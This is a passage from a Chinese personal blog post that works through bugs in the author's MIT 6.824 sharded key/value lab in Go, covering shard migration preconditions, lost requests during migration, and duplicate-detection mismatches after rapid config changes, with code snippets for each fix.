<p>为了解决这种问题，我们需要在取分片之前（ShardMigration）加上一个确认条件，即kv.afterUpdateConfig应该大于等于 args.LastConfigNum（就是afterUpdateConfig)</p>
<p><strong>问题3：部分请求丢失</strong></p>
<p>假设一种情况，数据A即将从gid100转移到gid101，一般来说，在转移过程中，server不会接受新的client请求，但是<strong>对于已经提交到raft但还未被shardkv apply的请求，无法被屏蔽</strong>。当数据A通过ShardMigration传递到gid101后，某个append{A,123}请求从raft被apply到shardkv，那么这个请求会被执行，并且会返回告知client，这个请求执行完成了。</p>
<p>那么下一次Get{A}的时候，就会发现数据A缺失了123，因为这个append123应该在gid101上被执行，但是它却在gid100被执行完了，并且这个数据没有更新到gid101上</p>
<p>为了解决这个问题，我在apply中也添加了一个checkShard(key)函数来检验请求是否正确，如果我们检测到了一个类似上述例子中apend{A,123}这样的请求，我们还是予以执行（个人选择，也可以选择不执行），但是会返回给client一个Err=ErrWrongGroup。</p>
<p>同时与ShardMigration中的前置判断条件相结合</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ShardMigration函数中的前置判断条件</span></span><br><span class="line"><span class="comment">//kv.configuration.Num&gt;=args.ConfigNum才向下执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum) &amp;&amp; time.Since(t0).Seconds()&lt;<span class="number">1</span>&#123;</span><br><span class="line">	time.Sleep(<span class="number">100</span>*time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> kv.configuration.Num&lt;args.ConfigNum || kv.afterUpdateConfig&lt;args.LastConfigNum&#123;</span><br><span class="line">	reply.WrongLeader=<span class="literal">true</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设gid100更新了config，那么在apply中就会对当前请求设置reply.Err=ErrWrongGroup，使client向gid101重发append{A,123}请求。而如果gid100还未更新config，那么在ShardMigration就会卡住直到它更新config为止</p>
<p>从前面这几个错误解析中我们可以知道，ShardMigration中的前置判断条件是非常重要且缺一不可的</p>
<p><strong>问题4：快速更新config导致状态信息与applyNum不匹配</strong></p>
<p>在前面的基础上，考虑一种情况，数据A{key：A，value：0}从gid100转移到gid101，在转移过程中，gid100的raft向其shardkv apply了请求append{key：A,value：123，clientId:1，opnum:20}，由问题3的解法知，gid100仍然执行了append请求，同时更新applyNum[1]=20，并返回一个ErrWrongGroup给client1，让client1重新发送这个append请求给gid101</p>
<p>但此时，在gid101还未接收到client1重发的append请求之前，新的config又来了，这次数据A要立即从gid101再转移回到gid100，这时由于我在ApplyNewConfig函数中使用覆盖的方式更新DB，那么gid.DB[A]从“0123”再次被覆盖为”0，但是由于applyNum=max（rf.applyNum,args.applyNum)，那么applyNum[1]仍然保留为20。</p>
<p>这样的话我们的DB信息和applyNum就出现了不匹配的情况，此时client1又重新发送append{key：A,value：123，clientId:1，opnum:20}给gid100，但是由于applyNum[1]=20，这个请求被判定为request dup，不会被执行。这就导致了数据A缺失了”123”这个部分的信息</p>
<p>我一开始想到了多个思路解决这个方法，让我们一一来想一想它们的可行性：</p>
<p>（1）在问题3中，我们对于“过时”的请求选择不执行，直接返回ErrGroup。这样gid100中applyNum就不会更新到20，请求就不会被判定为request dup，而是正确执行</p>
<p>这个解法看似正确，但是这只是对于leader而言，我们知道ShardMigration中是由leader来交接分片，那么我们上述的思路只能保证在leader中的正确性。但是对于每一个follower而言，它们更新config的时间点和leader不同（apply的时间点相同，但是更新不一定相同）可能这个请求在apply到shardkv时，它们的config还未更新，那么这个请求就不是”过时”的，它们会执行这个请求。在部分follower执行了这个请求后，我们又走上了错误的道路- -</p>
<p>另一方面看，选择不执行“过时”的请求可能导致leader和follower的不一致，所以我选择执行“过时”请求使leader和follower都执行了相同的请求，保持了它们的一致</p>
<p>（2）在ApplyNewConfig函数中，将<br>applyNum=max（rf.applyNum,args.applyNum)</p>
<p>改为<br>applyNum=args.applyNum</p>
<p>很显然这一定不对…因为这样会影响其他正常的client发送的请求，造成回退，进一步导致request dup</p>
<p>在摒弃了上面两种我认为不可行的方法后，我选择了如下方法</p>
<p>使用新的数据结构ErrGroupApply(clientId-&gt;key)来记录与“过时”请求相关的分片和clientId</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在apply中添加代码</span></span><br><span class="line"><span class="keyword">if</span> err==ErrWrongGroup&#123;</span><br><span class="line">	kv.ErrGroupApply[op.ClientId]=Command.Key  </span><br><span class="line"><span class="comment">//记录这次过时请求的clientId和key</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">delete</span>(kv.ErrGroupApply,op.ClientId)</span><br><span class="line"><span class="comment">//执行正常时删除clientId和对应的key</span></span><br><span class="line"><span class="comment">//因为这一次会正常的执行说明之前的请求都被正确处理了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一方面我们需要向ApplyNewConfig中添加一些代码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k,v:=<span class="keyword">range</span> kv.ErrGroupApply&#123;</span><br><span class="line">	<span class="keyword">if</span> args.ApplyNum[k]&lt;kv.applyNum[k]&#123;</span><br><span class="line"><span class="comment">//如果我的applyNum[clientId]更大，并且ErrGroupApply[clientId]存在说明出现</span></span><br><span class="line"><span class="comment">//出错情况，那么我们就在args中把这个applyNum和对应的部分数据删除，防止错误覆</span></span><br><span class="line"><span class="comment">//盖</span></span><br><span class="line">		<span class="built_in">delete</span>(args.ApplyNum,k)</span><br><span class="line">		<span class="built_in">delete</span>(args.State,v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仅仅是这样还不够，这可能造成新的错误，所以我们也需要修改ShardMigration</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ShardMigration中传递applyNum的部分代码</span></span><br><span class="line"><span class="keyword">for</span> index,v:=<span class="keyword">range</span> kv.applyNum&#123;</span><br><span class="line">	shd,ok:=kv.ErrGroupApply[index]</span><br><span class="line">	<span class="keyword">if</span> ok &amp;&amp; args.Shards!=(<span class="keyword">int</span>(shd[<span class="number">0</span>])%shardmaster.NShards)&#123;</span><br><span class="line">		reply.ApplyNum[index]=v<span class="number">-1</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		reply.ApplyNum[index]=v</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在ShardMigration中，无论请求的分片是什么，我们都会将全部client对应的applyNum传递出去。</p>
<p>而修改shardMigration是为了防止  分片请求者没有更新对应errGroup  shard，但是却获得了对应的ApplyNum造成与问题4相同的错误。</p>
<p>最后要记得将ErrGroupApply存入Snapshot，并修改restoreSnapshot和checkLogLength</p>
<p>坦白来说，我觉得我对于问题4的解决方法并不好，基本是属于简单的亡羊补牢类型的debug，但是由于我中期划水，导致我在6.824lab上花费了过多的时间，所以只能是以完成主要部分为主，不进行过多的设计优化</p>
<p><strong>总结</strong></p>
<p>到此为止MIT6.824的lab就完成了，虽然在细节上有很多的不足，但是我认为以我目前的水平能够基本完成测试点覆盖的大多数情况就足够了，进一步的代码优化任务就取决于以后的我了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wwow"
      src="/uploads/avatar.png">
  <p class="site-author-name" itemprop="name">wwow</p>
  <div class="site-description" itemprop="description">努力可能会成功，但不努力真的很舒服</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wwow</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
